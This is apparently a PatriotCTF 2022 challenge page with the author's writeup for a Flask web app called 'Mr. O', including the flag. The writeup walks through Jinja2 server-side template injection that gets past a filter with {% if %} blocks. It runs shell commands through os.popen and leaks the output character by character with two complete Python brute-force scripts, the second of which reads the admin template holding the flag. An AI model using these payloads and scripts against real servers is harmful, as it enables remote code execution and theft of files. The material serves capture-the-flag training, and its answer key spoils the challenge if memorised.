# Mr. O

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/blob/main/Web/Mr%20O/INSTALL.md)

### Description
I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get view the admin.html page, I will give you a flag. 

Hacked again, so I am now filtering those special words and characters, but I won't tell you what they are so you can't find out how I was hacked. I will give you guys a couple characters back because I got some complaints about going overboard with it, especially about not being able to use a period on a messaging service.

p.s. to save you some time, don't try getting a reverse shell

### Difficulty
7/10?

### Flag
`PCTF{chri5_bumst34d_i5_100king_thicc}`

### Hints
1. template injection
2. command execution
3. blind read w/ comparison to leak output

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This web app is alos vulnerable to template injection, but `{{` and `}}` is filtered, so we can't use the same method. Jinja has support for if statement templates that look like this: `{% if 'test' == 'test' %} render this string if true {% endif %}`. Let's see what happens when we send this message:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/raw/main/writeup-images/jinja_if.png" width=40%  height=40%></p>

Since Python is an OOP language, we can Method Resolution Order (MRO) to traverse across classes to a method we want, such as `os.popen`. Read more about this here: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/. The following payload makes use of this to run the `ls` command: `{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read() == 'test' %} a {% endif %}`

The problem is that we won't see the output. Instead of `ls`, you could just put a reverse shell and that'd be it, but I removed netcat from the docker and filtered basically any other useful special character so people can't do this.

We can instead do a blind test for the output of the command: `{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read().startswith('" + str(x) + "') %} found {% endif %}`

If we put any character in `x`, then we can test if the output of the `ls` command starts with that character by checking if we see `found` returned back to us. Let's run this with the letter "D": `{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read().startswith('D') %} found {% endif %}`
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/raw/main/writeup-images/ssti_found.png" width=40%  height=40%></p>

I chose "D" because `Dockerfile` is the first file in the docker. We just need to script this so we can see the whole output of `ls`. Once we have that, we can try to find the path to the `/admin.html` page so we can read the flag.

Here is the script:
```python
from os import popen
import string
import requests

SERVER_ADDR = "http://127.0.0.1:5000" # replace this with the actual IP of the docker

def get_cookie():
    data = {
        "username": "test", # make sure to make a test:test user first
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

final = ""
while True:
    for x in string.printable:
        x = final + x
        payload = {'message':"{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read().startswith('" + str(x) + "') %} found {% endif %}", 
        'username':'admin'}
        r = requests.post(url=SERVER_ADDR + "/messages", data=payload, cookies=cookie)
        if 'found' in r.text:
            final = x
            print(final)
            break
        else:
            pass
```

Let's run it:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/raw/main/writeup-images/ssti_ls.png" width=40%  height=40%></p>

We see the directory strucutre. We can keep running this until we find the /admin.html file, but I'll skip that. I use a basic flask directory structure, so it is located in `/app/templates/admin.html`. Now let's read the file. There is a lot of HTML fluff that would make the process take forever, so we can speed it up by grepping for `Flag` first. Here's the script:
```python
from os import popen
import string
import requests

SERVER_ADDR = "http://127.0.0.1:5000"

def get_cookie():
    data = {
        "username": "test", 
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

final = "Flag: PCTF{"
while True:
    for x in string.printable:
        x = final + x
        payload = {'message':"{% if request.application.__globals__.__builtins__.__import__('os').popen('grep -io flag.*\} ./app/templates/admin.html').read().startswith('" + str(x) + "') %} found {% endif %}", 
        'username':'admin'}
        r = requests.post(url=SERVER_ADDR + "/messages", data=payload, cookies=cookie)
        if 'found' in r.text:
            final = x
            print(final)
            break
        else:
            pass
```

Let's run it:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/raw/main/writeup-images/underground_flag.png" width=40%  height=40%></p>